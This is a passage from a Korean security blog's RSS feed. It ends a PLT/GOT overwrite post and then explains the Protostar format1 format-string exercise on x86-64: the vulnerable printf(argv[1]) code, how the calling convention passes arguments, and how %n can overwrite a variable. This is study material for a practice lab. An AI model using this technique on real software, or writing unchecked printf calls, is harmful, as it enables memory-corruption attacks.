&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;앞서 이야기한 것과 같이, plt의 주소는 고정되어 있기 때문에 ASLR을 켜도, ASLR을 꺼도 동일하게 익스플로잇에 성공할 수 있다.&lt;/p&gt;

&lt;p&gt;익스플로잇을 실행한 결과 아래와 같이 쉘을 딸 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Dec 2022 20:15:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/system_hacking/plt-got-overwrite</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/system_hacking/plt-got-overwrite</guid>
      </item>
    
      <item>
        <title>Protostar-format1.c x86-64</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#format1c&quot; id=&quot;markdown-toc-format1c&quot;&gt;Format1.c&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0-포맷-스트링-버그란&quot; id=&quot;markdown-toc-0-포맷-스트링-버그란&quot;&gt;0. 포맷 스트링 버그란&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-포맷-스트링이란&quot; id=&quot;markdown-toc-01-포맷-스트링이란&quot;&gt;0.1. 포맷 스트링이란&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-예제-코드-분석&quot; id=&quot;markdown-toc-1-예제-코드-분석&quot;&gt;1. 예제 코드 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-익스플로잇&quot; id=&quot;markdown-toc-2-익스플로잇&quot;&gt;2. 익스플로잇&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-취약점-익스플로잇-방법-지정&quot; id=&quot;markdown-toc-21-취약점-익스플로잇-방법-지정&quot;&gt;2.1. 취약점 익스플로잇 방법 지정&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#211-배경-설명&quot; id=&quot;markdown-toc-211-배경-설명&quot;&gt;2.1.1. 배경 설명&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#212-익스플로잇-설계&quot; id=&quot;markdown-toc-212-익스플로잇-설계&quot;&gt;2.1.2. 익스플로잇 설계&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-논외-수학적으로-읽어야-할-주소-개수-구하기를-시도했는데-고려한-변수가-한두개가-아니라-포기한-건에-대하여&quot; id=&quot;markdown-toc-3-논외-수학적으로-읽어야-할-주소-개수-구하기를-시도했는데-고려한-변수가-한두개가-아니라-포기한-건에-대하여&quot;&gt;3. 논외-수학적으로 읽어야 할 주소 개수 구하기를 시도했는데 고려한 변수가 한두개가 아니라 포기한 건에 대하여&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;format1c&quot;&gt;Format1.c&lt;/h1&gt;

&lt;p&gt;결론부터 말하자면, 이 문제는 64비트로 푸는 게 불가능한 문제다. 입력값으로 페이로드를 받는다면 어떻게든 풀 수 있겠으나, 함수의 인자로 페이로드를 받기 때문에 리눅스 쉘의 파이프 특성상 null byte가 제외되어 불가능하다.&lt;/p&gt;

&lt;p&gt;그래도 문제를 풀며 많은 것을 알게 되었으니 이렇게 정리해 둔다.&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-포맷-스트링-버그란&quot;&gt;0. 포맷 스트링 버그란&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;버퍼 오버플로우 취약점으로 이어질 수 있는 버그로,&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;사용자 입력을 검증하지 않고 사용한 결과&lt;/li&gt;
    &lt;li&gt;사용자가 악의적인 용도로 입력한 Format String이&lt;/li&gt;
    &lt;li&gt;프로그램 실행에 영향을 끼치는 것을 의미한다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;01-포맷-스트링이란&quot;&gt;0.1. 포맷 스트링이란&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;C언어에서 자주 사용되는 “출력 용도의 함수”가 출력할 “데이터의 형식을 지정”하기 위해 사용하는 특수 문자&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;포맷 스트링의 종류는 매우 다양하다.&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;인자  &lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;  입력 타입  &lt;/th&gt;
          &lt;th style=&quot;text-align: left&quot;&gt; 출력  &lt;/th&gt;
          &lt;th style=&quot;text-align: left&quot;&gt; 익스플로잇 용도  &lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%d  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  값  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 10진수 &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%s &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터 &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  해당 포인터가 가리키는 문자열  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%x  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  값  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 16진수  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 메모리를 읽을 때 사용한다  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%u  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  값  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; Unsigned 10진수  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%p  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 포인터가 가리키는 메모리 주소  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%n  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; %n이 나오기 전까지 출력했던 바이트 수를, &lt;br /&gt; 포인터가 가리키는 메모리 주소에 넣어줌  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  메모리 값을 변조할 때 사용한다 &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;%c  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; 포인터  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; 1byte 한 글자  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;…  &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;  …  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt; …  &lt;/td&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;  &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;위 포맷 스트링 중 가장 중요한 건 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 이다.&lt;/li&gt;
  &lt;li&gt;특히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 의 경우, 메모리 주소를 가리키는 포인터를 인자로 받기 때문에 32비트 환경에서는 4바이트, 64비트 환경에서는 8 바이트를 한 번에 읽어서 주소로 사용한다는 점 잊지 말기!
&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;1-예제-코드-분석&quot;&gt;1. 예제 코드 분석&lt;/h1&gt;

&lt;p&gt;주어진 코드는 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you have modified the target :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;사용자에게서 프로그램의 argument로 입력받은 값을 문자열의 형태로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; 함수에게 넘겨준다.&lt;/p&gt;

&lt;p&gt;해당 문자열은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;에서 즉석으로 호명되며, 이후 프로그램의 control flow는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 내부로 흘러들어가게 되고, 해당 함수 내에서 입력된 문자열과 format string이 처리된다.&lt;/p&gt;

&lt;p&gt;format string bug는 바로 이 지점, 즉 프로그램이 컴파일되어 실행되는 시점과 사용자 입력을 처리하여 알맞은 행위를 취하는 시점의 시차에서 발생한다.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-익스플로잇&quot;&gt;2. 익스플로잇&lt;/h1&gt;

&lt;p&gt;익스플로잇은 아래의 단계로 구성된다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;프로그램 분석해 취약점 확정&lt;/li&gt;
  &lt;li&gt;취약점을 익스플로잇할 방법 지정&lt;/li&gt;
  &lt;li&gt;익스플로잇 생성 및 실행&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;먼저 주어진 프로그램을 익스플로잇했을 때 성취해야 할 목적은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수를 0 이외의 것으로 변경하는 것이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수는 global int로 uninitialized 이기 때문에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; 영역에 저장될 것이고, 전역변수인 이상 컴파일 당시 컴파일러에 의해 0으로 자동 초기화될 것이기 때문이다.&lt;/p&gt;

&lt;p&gt;앞에서 프로그램 분석과 취약점 확정을 마무리했으므로, 2) 취약점 익스플로잇 방법 확정부터 시작한다.&lt;/p&gt;

&lt;h2 id=&quot;21-취약점-익스플로잇-방법-지정&quot;&gt;2.1. 취약점 익스플로잇 방법 지정&lt;/h2&gt;

&lt;h3 id=&quot;211-배경-설명&quot;&gt;2.1.1. 배경 설명&lt;/h3&gt;

&lt;p&gt;64bit 프로그램에서 아래와 같은 printf 구문이 함수 내에 있을 때 printf가 변수를 참조하는 방식에 대해 자세히 알아보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위의 코드 라인이 진행되면 결론적으로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(&apos;%p.%x.%c.%d.%f.%h.%n&apos;)&lt;/code&gt; 가 실행되는데, 이때 주의깊게 봐야 할 것은 64비트 프로그램에서 함수에 인자를 전달할 때 레지스터와 스택의 사용 방식이다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;리눅스용 gcc는 64비트 컴파일 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastcall&lt;/code&gt; 이라는 calling convention을 사용하는데, 이 규약 하에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi, rsi, rdx, rcx, r8, r9&lt;/code&gt; 순으로 인자가 들어가고 남아있는 인자는 스택에 마지막 인자부터 push하여 이후 스택에서 인자를 pop할 때 순서대로 pop되도록 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 함수에서 인자는 어떤 식으로 전달될까? 익스플잇할 대상 프로그램에 직접 디버거를 붙여 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; , 즉 첫 번째 인자로 프린트할 스트링의 시작 주소가 주어졌고&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; , 즉 두번째 인자로 현재 프로세스의 적재 위치가 주어졌다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;만일 대상 프로그램에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(string)&lt;/code&gt; 이 아닌 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(string, 0xDEADBEEF, ... , 0xCAFECAFE)&lt;/code&gt; 등의 형식으로 여러 인자를 전달했다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; 는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xDEADBEEF&lt;/code&gt; … 식이 되었을 것이다.&lt;/p&gt;

&lt;p&gt;이처럼, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 함수는 프린트할 스트링의 시작주소를 무조건 첫 번째 인자로 받고, 해당 스트링에 포맷 스트링이 6개 포함되어 있을 경우 함수의 인자 규칙과 calling convention에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt; 을 각 포맷 스트링에 대해 순서대로 참조한다. 이 사실을 기반으로 다시 한 번 예시를 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(buf)&lt;/code&gt; 가 인자를 사용하기 위해 레지스트리와 스택을 참조하는 순서는 아래와 같을 것이다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;: &amp;amp;buf&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;: some hex value → %p에 주어질 포인터로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;:  ‘’ → %x에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;:  ‘’ → %c에 주어질 포인터로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;:  ‘’ → %d에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt;:  ‘’ → %f에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;:  ‘’ → %h에 주어질 값으로서 참조&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack(next address)&lt;/code&gt;:  ‘’ → %n에 주어질 포인터로서 참조&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 언급된 포맷 스트링 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt;에 대해 자세히 알아보자. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 인자로서 어떤 메모리의 주소(포인터)를 받는다. 이렇게 받은 포인터가 가리키는 메모리에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 자신이 나오기 전까지 입력된 문자의 개수를 입력한다.&lt;/p&gt;

&lt;p&gt;포맷 스트링 중 유일하게 메모리 값을 변조하는 것이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 포맷 스트링이기 때문에 이는 익스플로잇에 매우 자주 이용된다.&lt;/p&gt;

&lt;h3 id=&quot;212-익스플로잇-설계&quot;&gt;2.1.2. 익스플로잇 설계&lt;/h3&gt;

&lt;p&gt;앞서 설명한 내용의 요점은 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;64비트 프로그램의 Calling Convention을 고려했을 때, 입력값을 검증하지 않고 사용하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; 함수에게 format string을 많이 주어 스택에 순차적으로 접근할 수 있다.&lt;/li&gt;
  &lt;li&gt;포맷 스트링 중 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 만이 유일하게 사용자의 입력값을 반영하여 인자로 주어진 포인터가 가리키는 메모리 값을 변조한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;따라서 아래와 같이 익스플로잇의 개념을 설계할 수 있다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;충분히 많은 format string을 사용하여 스택에 접근할 수 있도록 한 뒤, 마지막으로 사용된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; format string이 참조할 스택 위치에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 주소가 들어가도록 한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 결론적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; 변수의 값을 이제까지 받은 character의 수로 변조하게 될 것이다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;말로만 하니 이해가 힘들 수 있다. 그림을 보면서 이해해 보자.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;주의:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 은 사실 아래 그림과 같은 식으로 존재하지 않는다. 아무래도 이중 배열이니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[0]&lt;/code&gt; 이 진짜로 있는 곳 바로 아래에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; 이 있고, 그게 가리키는 곳에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 이 있을 거라… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 의 스택 프레임 내부에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 이 보일 리가 없다. 그러나 설명의 용이를 위해 아래와 같이 그린 점 감안해 주십사…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

